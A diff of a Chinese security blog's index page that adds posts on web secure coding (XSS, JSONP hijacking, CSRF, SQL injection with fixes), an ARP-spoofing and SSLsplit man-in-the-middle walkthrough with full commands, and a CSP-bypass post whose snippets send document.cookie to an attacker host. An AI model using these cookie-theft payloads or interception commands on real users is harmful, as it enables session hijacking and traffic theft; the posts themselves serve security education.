@@ -152,6 +152,218 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-web安全/安全编码" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/01/09/web安全/安全编码/">WEB安全基础</a>
+    </h1>
+  
+
+        <a href="/2017/01/09/web安全/安全编码/" class="archive-article-date">
+  	<time datetime="2017-01-09T03:12:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-01-09</time>
+</a>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>安全事件频发，安全漏洞层出不穷，sql注入、xss跨站攻击等各种漏洞是怎么产生的，怎样从根源上减少这些安全漏洞的出现，本文着重介绍了一些常见的，但是开发又很容易忽视的点。主要包括了跨域漏洞、针对服务器的注入攻击等，配合一些案例对漏洞产生的原因和修复方法进行了介绍。</p>
+<h3 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h3><p>针对web的攻击，主要分为前端攻击方式和服务器端攻击方式</p>
+<p>前端的攻击方式比较常见的有XSS、CSRF、点击劫持等</p>
+<p>后端的攻击方式比较常见的是注入类攻击、上传类攻击、认证攻击</p>
+<p>下面分别对出现比较多的漏洞一一做下介绍</p>
+<h4 id="跨站攻击"><a href="#跨站攻击" class="headerlink" title="跨站攻击"></a>跨站攻击</h4><p>在介绍这些漏洞之前，首先说一下最重要也是最基本的安全功能——同源策略</p>
+<blockquote>
+<p>浏览器的同源策略、限制了来自不同源的document或脚本，对当前的document读取或设置某些属性</p>
+</blockquote>
+<p>同源的几个因素：host、子域名、端口、协议</p>
+<p>在web开发中经常会用到第三方域的资源，标签<code>&lt;script&gt;、&lt;img&gt;、&lt;iframe&gt;、&lt;link&gt;</code>等都是可以跨域加载资源的，而不受同源策略的限制。当然也是可以用来绕过同源策略。</p>
+<p>现在跨站攻击并不单单是xss攻击，还有其他很多形式的跨站攻击类型</p>
+<p>跨站里面最多的就是跨站脚本也就是XSS，这个不管是多大的站点都会遇到，XSS大家都知道分为三种：反射、存储、DOM型，之间的差别大家应该都知道了，下面说下在代码方面形成漏洞的原因</p>
+<p>最根本的原因就是没有对用户的输入进行过滤，在防护安全方面，大家记住一点就是：永远不要相信用户输入的内容</p>
+<p>最简单的漏洞代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$input =$_GET[<span class="string">"param"</span>];</div><div class="line"><span class="keyword">echo</span> <span class="string">"&lt;div&gt;"</span>.$input.<span class="string">"&lt;/div&gt;"</span>;</div></pre></td></tr></table></figure>
+<p>用户只要向param提交数据就可以展示到页面上，那要是提交<code>&lt;script&gt;</code>脚本,那么就能利用这个js脚本去做一些危害性的操作了</p>
+<p>其实所有的xss归根到底就是上面这段代码，不管怎么变化，用户输入的信息能展示到页面上来</p>
+<p>这里我们从xsspayload入手，看代码如何防范xss漏洞的发生</p>
+<p>xsspayload 链接地址：<a href="https://html5sec.org/，里面包括了大部分的xss利用代码" target="_blank" rel="external">https://html5sec.org/，里面包括了大部分的xss利用代码</a></p>
+<p>这种开发遇到的最多，对于这个也是有成熟的修复方案——转义、编码处理，对于常见的不再过多关注，但是要注意不同地方的xss是有不同的处理方式的，修复方案我们放到了wiki上面，大家可以参考：<a href="http://wiki.n.miui.com/pages/viewpage.action?pageId=18999359。" target="_blank" rel="external">http://wiki.n.miui.com/pages/viewpage.action?pageId=18999359。</a></p>
+<p>下面介绍一些不常见的跨域漏洞</p>
+<ol>
+<li>flash跨域</li>
+</ol>
+<p>这个在很多网站都是被忽视的，flash有个跨域策略文件crossdomain.xml</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;cross-domain-policy&gt;</div><div class="line">&lt;allow-access-from domain=&quot;www.friendOfFoo.com&quot; /&gt;</div><div class="line">&lt;allow-access-from domain=&quot;*.foo.com&quot; /&gt;</div><div class="line">&lt;allow-access-from domain=&quot;105.216.0.40&quot; /&gt;</div><div class="line">&lt;/cross-domain-policy&gt;</div></pre></td></tr></table></figure>
+<p>但是很多开发是很喜欢直接用成*的</p>
+<p>来看个例子：</p>
+<p><a href="http://c.mi.com/crossdomain.xml" target="_blank" rel="external">http://c.mi.com/crossdomain.xml</a> 这个直接设置成了*</p>
+<p>我们利用flash中的as脚本，有个现成的工具可以使用：<a href="https://15.rs/ContentHijacking/ContentHijackingLoader.html，取请求：http://c.mi.com" target="_blank" rel="external">https://15.rs/ContentHijacking/ContentHijackingLoader.html，取请求：http://c.mi.com</a></p>
+<p>可以看到是可以完全获取到页面的内容的。要是账户在登入的情况下，那么可以获取到用户的一些敏感信息的，把这些信息传递出去，就造成了用户的信息泄漏</p>
+<ol>
+<li>jsonp跨域</li>
+</ol>
+<p>这个产生的问题也是很多的，很多直接参用callback来回调函数名，但是直接访问这个jsonp链接，返回的http头部信息是html，并且没有对参数值做任何限制，导致直接使用callback=<script src="ssss"></script>嵌入了第三方的js，产生了跨域</p>
+<p>还有一种做了特殊符号的处理，但是返回的响应形式是：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$callback = $_GET[<span class="string">'callback'</span>];</div><div class="line">$callback=preg_replace(<span class="string">"/[')(&lt;&gt;&#123;&#125;]|\]|\[|\/|\\\|\"|\|/"</span>,<span class="string">""</span>,$callback);</div><div class="line"><span class="keyword">echo</span> <span class="string">"&lt;script&gt;"</span>.$callback.<span class="string">"()&lt;/script&gt;"</span>;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>这个也是会产生漏洞的，这个带给大家思考下，这个会产生什么样的漏洞</p>
+<p>jsonp还有个问题也是经常出现的，就是json劫持漏洞，看个代码：</p>
+<p>B站的json连接<a href="http://b.test.com/json/data.php?callback=call：" target="_blank" rel="external">http://b.test.com/json/data.php?callback=call：</a></p>
+<p>返回的页面内容：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">call("data":"I am secret data!!!")</div></pre></td></tr></table></figure>
+<p>A站的get代码：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></div><div class="line">function hijack(data)&#123;console.log(data.data);&#125;</div><div class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://b.test.com/json/data.php?callback=hijack"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure>
+<p>这样通过jsonp传递个人敏感信息的话，利用json劫持就能获取到，导致个人敏感信息泄漏</p>
+<ol>
+<li>CORS</li>
+</ol>
+<p>这个是h5最新的一个头，主要就是通过设置相应头中的 Access-Control-Allow-Origin 字段。。</p>
+<p>Access-Control-Allow-Origin 响应字段说明了该资源或网站所允许被非同源站点访问的站点列表，当 Access-Control-Allow-Origin 中包含网站 A 或者设置为 * 时，网站 A 即可对网站 B 上的资源进行任意访问。</p>
+<p>也就是利用ajax请求可以获取到数据信息的。对于这个头部信息对于防御xss是很有效的，作为开发可以研究下这个</p>
+<ol>
+<li>postMessage</li>
+</ol>
+<p>这里用这个的时候，看代码所示：</p>
+<p>B站的data数据：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">window.onload=function()&#123;</div><div class="line">  parent.postMessage(&apos;I am secret data!!&apos;,&apos;*&apos;);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>获取数据代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;iframe src=&quot;http://b.test.com/H5/data.html&quot;&gt;&lt;/iframe&gt;</div><div class="line">&lt;script&gt;</div><div class="line">window.addEventListener(&apos;message&apos;,function(e)&#123;</div><div class="line">  alert(e.data);</div><div class="line">&#125;)</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure>
+<p>这样就能直接获取到传递的敏感数据，所以在设置这个的时候不要直接设置成*,限制到自己的域下面</p>
+<ol>
+<li>iframe挂马</li>
+</ol>
+<p>很多站点，比如富文本的一些输入允许iframe的加载，iframe是无法对宿主域进行操作的，但是可以进行挂马，前段时间遇到一个需求，就是一个统一登入站点的背景是iframe进来的其他站点，其他站点的安全性不能保证，并且里面有些内容是用户可以控制到的，这样怎么保证我们统一登入的这个站点不受影响？（sandbox属性）</p>
+<ol>
+<li>后台xss</li>
+</ol>
+<p>主要集中在后台接受用户的留言反馈等地方没有注意到防御xss，导致攻击者可以直接输入xss语句进入后台中，管理员在查看到这个留言时候触发xss，把自己的登入凭证通过第三方的xss传递给攻击者，若是后台有没有做访问限制，则攻击者就能登入后台</p>
+<ol>
+<li>水坑攻击、鱼叉攻击</li>
+</ol>
+<p>也不算是新型的攻击方式，这个攻击是攻击者将一些攻击字段放入了flash cookie、los中，需要用户在特定的情况下才能触发，算是留了个水坑等用户去踩</p>
+<h4 id="CSRF漏洞"><a href="#CSRF漏洞" class="headerlink" title="CSRF漏洞"></a>CSRF漏洞</h4><p>这里就需要了解浏览器的cookie策略，cookie的几个重要属性：domain、path、Expires、Secure、HttpOnly。</p>
+<p>其中domain和path保证了改cookie只能在特定的域下生效，cookie是有失效时间的，若是在失效时间之内访问domain的path就会发送改cookie，这样就是csrf能利用的根本原因</p>
+<p>CSRF就是对于某些操作行为的连接，攻击者将该链接利用<code>&lt;img&gt;\&lt;iframe&gt;</code>等标签嵌入页面中，受害者访问该链接后自动触发了改行为操作，也就是在你不知不觉中完成了某项操作</p>
+<p>产生的原因：</p>
+<ol>
+<li>GET or POST</li>
+</ol>
+<p>使用get请求完成某项的操作行为是比较危险的</p>
+<p>使用POST请求如果没有进行referer的验证，自己构造一个form页面也是可以进行攻击的</p>
+<p>这些都是使用的cookie的策略，访问某个网站，改网站的cookie会自动的发送过去</p>
+<ol>
+<li>无一次性认证token</li>
+</ol>
+<p>token保证了本次请求的一次性，即使攻击者获取到改连接。发送过去也是失效的</p>
+<ol>
+<li>验证码</li>
+</ol>
+<p>这个也能很好的防止CSRF攻击，但是牺牲的是用户的体验问题</p>
+<p>这里有个问题：</p>
+<p>怎样必须使用get请求而不会产生csrf呢？</p>
+<h4 id="注入类漏洞"><a href="#注入类漏洞" class="headerlink" title="注入类漏洞"></a>注入类漏洞</h4><ol>
+<li>SQL注入</li>
+</ol>
+<p>sql注入被誉为注入之王，不管安全技术、防御技术怎么发展，爆出被sql注入获取到的数据的新闻从来没有停止过，其中不乏比较大的公司</p>
+<p>sql注入最简单的一段代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">var shipcity;</div><div class="line">shipcity = Request.from(&quot;shipcity&quot;);</div><div class="line">var sql=&quot;select * from OridersTable where shipcity=&apos;&quot;+Shipcity +&quot;&apos;&quot;;</div></pre></td></tr></table></figure>
+<p>SQL注入语句就不展示了，闭合单引号，插入sql语句。</p>
+<p>现在的sql注入很多情况下是会爆出sql错误的，这个相对分析起来很容易知道那个点存在sql注入，但是现在很多都会把错误信息屏蔽掉，而且现在的sql注入不仅仅是通过服务器sql报错等进行判断了</p>
+<p>针对这种情况，攻击者研究出了盲注的方法，服务器没有错误回显，那么可以通过分析返回页面内容进行判断</p>
+<p>在现在的sql注入中用到的最多的就是基于时间的盲注技巧，通过sql语句的执行时间进行判断</p>
+<p>针对sql注入的防御，规范的编码规范可以很好的进行防御</p>
+<ul>
+<li>使用预编译语句</li>
+</ul>
+<p>预防sql注入的最佳方式，使用预编译语句绑定变量</p>
+<p>再java中：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">String query = <span class="string">"select account from user_data where user_name=?"</span>;</div><div class="line">PreparedStatement psmtm = connection.preparedStatement(query);</div><div class="line">psmtm.setString(<span class="number">1</span>,custname)</div></pre></td></tr></table></figure>
+<p>不同的语言都有不同的预编译的方法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">java EE ： PreparedStatement()</div><div class="line">.NET : SqlCommand() or OleDbCommand()</div><div class="line">PHP: bindParam()</div><div class="line">Hibernate: createQuery()</div><div class="line">SQLite: sqlite3_prepare()</div></pre></td></tr></table></figure>
+<ul>
+<li><p>使用存储过程</p>
+</li>
+<li><p>检查数据类型</p>
+</li>
+<li><p>使用安全的函数</p>
+</li>
+</ul>
+<p>每个语言中都有一些编码的函数，可以帮助对抗sql注入</p>
+<ul>
+<li>最小权限原则</li>
+</ul>
+<ol>
+<li><p>xml注入</p>
+</li>
+<li><p>代码注入</p>
+</li>
+</ol>
+<p>QQ客户端的命令执行</p>
+<p>注入攻击其实是违背了“数据和代码分离的原则”，导致了用户输入的数据变为代码进行了执行。</p>
+<h4 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h4><h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><h4 id="奇葩漏洞"><a href="#奇葩漏洞" class="headerlink" title="奇葩漏洞"></a>奇葩漏洞</h4><h4 id="H5里面的一些安全设置"><a href="#H5里面的一些安全设置" class="headerlink" title="H5里面的一些安全设置"></a>H5里面的一些安全设置</h4><ol>
+<li>iframe 中的sandbox</li>
+<li>Link Types中的noreferer</li>
+<li>webStorage</li>
+</ol>
+<h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><ol>
+<li>认证绕过<br>这个问题也是出现很多的，很多开放喜欢使用前端获取服务器的返回值来判断是否进行下一步操作或者是否认证成功。</li>
+</ol>
+<p>案例：</p>
+<p>在发布二手买卖信息时候，在填写取货信息时有个对是否是本人手机的验证，</p>
+<p><img src="./581.jpg" alt="58"></p>
+<p>在这个时候拦截网址<a href="http://post.58.com/ajax/?action=checkmobilecodeandblind&amp;phone=13945678910&amp;code=123123123&amp;userid=xxxxxx，是服务器返回的值，一般验证码不对的话会返回-1或者0，修改值为1，通行，直接发布成功" target="_blank" rel="external">http://post.58.com/ajax/?action=checkmobilecodeandblind&amp;phone=13945678910&amp;code=123123123&amp;userid=xxxxxx，是服务器返回的值，一般验证码不对的话会返回-1或者0，修改值为1，通行，直接发布成功</a></p>
+<ol>
+<li>js限制登入</li>
+</ol>
+<p>在js中限制登入，删除js直接登入后台</p>
+<ol>
+<li>表面认证</li>
+</ol>
+<p>只是做了个登入页面来做认证，后面的二级页面没有验证用户是否真的登入</p>
+<p>案例：</p>
+<p><img src="./info1.jpg" alt="info"></p>
+<p>直接访问这些连接就能看到学生的所有信息</p>
+<p><img src="./info2.jpg" alt="info"></p>
+<ol>
+<li>点击劫持</li>
+</ol>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags"></i>
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web安全/">web安全</a></li></ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2017/01/09/web安全/安全编码/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+  
     <article id="post-soft/kafka命令操作" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -710,6 +922,180 @@
 
 
   
+    <article id="post-安全测试/中间人攻击获取ssl-tsl数据" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/12/16/安全测试/中间人攻击获取ssl-tsl数据/">中间人攻击获取ssl数据</a>
+    </h1>
+  
+
+        <a href="/2016/12/16/安全测试/中间人攻击获取ssl-tsl数据/" class="archive-article-date">
+  	<time datetime="2016-12-16T03:12:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-12-16</time>
+</a>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="数据流量重定向"><a href="#数据流量重定向" class="headerlink" title="数据流量重定向"></a>数据流量重定向</h2><ul>
+<li>使用ARP欺骗。发送假的网关(gateway)的MAC地址（其实是攻击者的MAC地址) 给受害者, 让受害者误以为 攻击者就是网关。你不需要物理访问受害者的设备就能做到。</li>
+<li>手动改变 受害者的 默认网关。如果你能物理访问受害者设备，这是最简单的方法</li>
+<li>DNS欺骗。 对特定的域名，返回攻击者的IP作为目标服务器的地址 给受害者。</li>
+<li>修改受害者机器的/etc/hosts的条目来 转向某些域名的流量</li>
+</ul>
+<h3 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a>ARP欺骗</h3><ol>
+<li>环境：</li>
+</ol>
+<ul>
+<li>攻击者ip:192.168.31.200 操作主机</li>
+<li>网关：192.168.31.1 路由器</li>
+<li>受害者：192.168.31.224 手机或电脑</li>
+</ul>
+<ol>
+<li>开启ip转发</li>
+</ol>
+<p><code>echo 1 &gt;&gt; /proc/sys/net/ipv4/ip_forward</code></p>
+<ol>
+<li>生成CA证书  </li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">openssl genrsa -out ca.key 4096</div><div class="line">openssl req -new -x509 -days 1826 -key ca.key -out ca.crt</div></pre></td></tr></table></figure>
+<ul>
+<li>第1个命令，生成 4096位的RSA私钥（以pem格式保存) ca.key</li>
+<li>第2个命令， 使用这个刚生成的私钥，来生成一个 自签名的 root CA 证书(ca.crt)</li>
+</ul>
+<p>这两个文件在后面都会用到。只有ca.crt这个证书文件，需要安装 到浏览器，或者受害者的机器上。</p>
+<ol>
+<li>端口流量转发</li>
+</ol>
+<p>用iptables进行流量转发，需要把我们需要的端口进行转发</p>
+<blockquote>
+<p>8080用作非SSL的TCP连接，比如 http, smtp, ftp<br>8443 用作SSL的连接，比如SMTP over SSL, HTTPS等</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">sysctl -w net.ipv4.ip_forward=1</div><div class="line">iptables -t nat -F</div><div class="line">iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080</div><div class="line">iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443</div><div class="line">iptables -t nat -A PREROUTING -p tcp --dport 587 -j REDIRECT --to-ports 8443</div><div class="line">iptables -t nat -A PREROUTING -p tcp --dport 465 -j REDIRECT --to-ports 8443</div><div class="line">iptables -t nat -A PREROUTING -p tcp --dport 993 -j REDIRECT --to-ports 8443</div><div class="line">iptables -t nat -A PREROUTING -p tcp --dport 995 -j REDIRECT --to-ports 8443</div></pre></td></tr></table></figure>
+<ol>
+<li>ARP欺骗</li>
+</ol>
+<p><code>ettercap -T -q -M ARP //192.168.31.224/ //192.168.31.1/</code></p>
+<p><code>arpspoof -i eth0 -t 192.168.31.1 192.168.31.224</code></p>
+<ol>
+<li>直接建立热点</li>
+</ol>
+<p>kali下可以直接建立热点，需要打开iptables的nat功能<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE #对eth0进行源nat</div><div class="line">iptables -A FORWARD -i wlan1 -o eth0 -j ACCEPT #把无线网卡流量转发到有线网卡（或者什么能上网的网卡）上面</div><div class="line">iptables -A FORWARD -p tcp --syn -s 10.0.0.0/24 -j TCPMSS --set-mss 1356 #修改最大报文段长度</div></pre></td></tr></table></figure></p>
+<ol>
+<li>使用SSLsplit进行</li>
+</ol>
+<p><code>sslsplit -D -l connect.log -j /opt/sslsplit/test1 -S logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080</code></p>
+<ol>
+<li>使用starttls-mitm进行(<a href="https://github.com/adrain09/starttls-mitm" target="_blank" rel="external">https://github.com/adrain09/starttls-mitm</a>)</li>
+</ol>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags"></i>
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/安全测试/">安全测试</a></li></ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2016/12/16/安全测试/中间人攻击获取ssl-tsl数据/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+  
+    <article id="post-web安全/绕过csp发送cookie" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/12/16/web安全/绕过csp发送cookie/">CSP bypass</a>
+    </h1>
+  
+
+        <a href="/2016/12/16/web安全/绕过csp发送cookie/" class="archive-article-date">
+  	<time datetime="2016-12-16T03:12:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-12-16</time>
+</a>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <ol>
+<li>dns 預读取</li>
+</ol>
+<p>firefox</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;link rel=&quot;dns-prefetch&quot; href=&quot;[cookie].xss.com&quot;&gt;dns</div></pre></td></tr></table></figure>
+<p>chrome</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">chrome浏览器的csp策略对&lt;link&gt;标签rel属性则更为宽松,使用prefetch即可</div><div class="line">直接用get方式把cookie传递到攻击者的服务器上</div><div class="line">&lt;link rel=&quot;prefetch&quot; href=&quot;http://www.xss.com/x.php?c=[cookie]&quot;&gt;</div><div class="line">只需要用js动态创建元素的方法,就可在href中插入cookie</div></pre></td></tr></table></figure>
+<ol>
+<li>通用的bypass</li>
+</ol>
+<p>其实在script脚本允许unsafe-inline的情况下,会有更多的通用,而且无法被过滤的绕过方式,比如:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">window.location=&quot;http://www.xss.com/x.php?c=[cookie]&quot;;</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure>
+<p>比如动态创建元素,再引发页面跳转</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">var a=document.createElement(&quot;a&quot;);</div><div class="line">a.href=&apos;http://www.xss.com/?c=&apos;+escape(document.cookie);</div><div class="line">a.click();</div></pre></td></tr></table></figure>
+<p>或者是使用<meta>标签进行跳转</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;meta http-equiv=&quot;refresh&quot; content=&quot;5;url=http://www.xss.com/x.php?c=[cookie]&quot; &gt;</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">var i=document.createElement(&quot;img&quot;);</div><div class="line">i.src=&apos;http://www.xss.com/?c=&apos;+escape(document.cookie);</div><div class="line">xxx.appendChild(i);</div></pre></td></tr></table></figure>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags"></i>
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web安全/">web安全</a></li></ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2016/12/16/web安全/绕过csp发送cookie/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+  
     <article id="post-移动安全/drozer测试InsecureBankv2" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -825,268 +1211,6 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2016/12/16/移动安全/drozer测试InsecureBankv2/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-
-
-
-
-
-
-
-  
-    <article id="post-web安全/绕过csp发送cookie" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2016/12/16/web安全/绕过csp发送cookie/">CSP bypass</a>
-    </h1>
-  
-
-        <a href="/2016/12/16/web安全/绕过csp发送cookie/" class="archive-article-date">
-  	<time datetime="2016-12-16T03:12:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-12-16</time>
-</a>
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <ol>
-<li>dns 預读取</li>
-</ol>
-<p>firefox</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;link rel=&quot;dns-prefetch&quot; href=&quot;[cookie].xss.com&quot;&gt;dns</div></pre></td></tr></table></figure>
-<p>chrome</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">chrome浏览器的csp策略对&lt;link&gt;标签rel属性则更为宽松,使用prefetch即可</div><div class="line">直接用get方式把cookie传递到攻击者的服务器上</div><div class="line">&lt;link rel=&quot;prefetch&quot; href=&quot;http://www.xss.com/x.php?c=[cookie]&quot;&gt;</div><div class="line">只需要用js动态创建元素的方法,就可在href中插入cookie</div></pre></td></tr></table></figure>
-<ol>
-<li>通用的bypass</li>
-</ol>
-<p>其实在script脚本允许unsafe-inline的情况下,会有更多的通用,而且无法被过滤的绕过方式,比如:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">window.location=&quot;http://www.xss.com/x.php?c=[cookie]&quot;;</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure>
-<p>比如动态创建元素,再引发页面跳转</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">var a=document.createElement(&quot;a&quot;);</div><div class="line">a.href=&apos;http://www.xss.com/?c=&apos;+escape(document.cookie);</div><div class="line">a.click();</div></pre></td></tr></table></figure>
-<p>或者是使用<meta>标签进行跳转</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;meta http-equiv=&quot;refresh&quot; content=&quot;5;url=http://www.xss.com/x.php?c=[cookie]&quot; &gt;</div></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">var i=document.createElement(&quot;img&quot;);</div><div class="line">i.src=&apos;http://www.xss.com/?c=&apos;+escape(document.cookie);</div><div class="line">xxx.appendChild(i);</div></pre></td></tr></table></figure>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web安全/">web安全</a></li></ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2016/12/16/web安全/绕过csp发送cookie/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-
-
-
-
-
-
-
-  
-    <article id="post-安全测试/中间人攻击获取ssl-tsl数据" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2016/12/16/安全测试/中间人攻击获取ssl-tsl数据/">中间人攻击获取ssl数据</a>
-    </h1>
-  
-
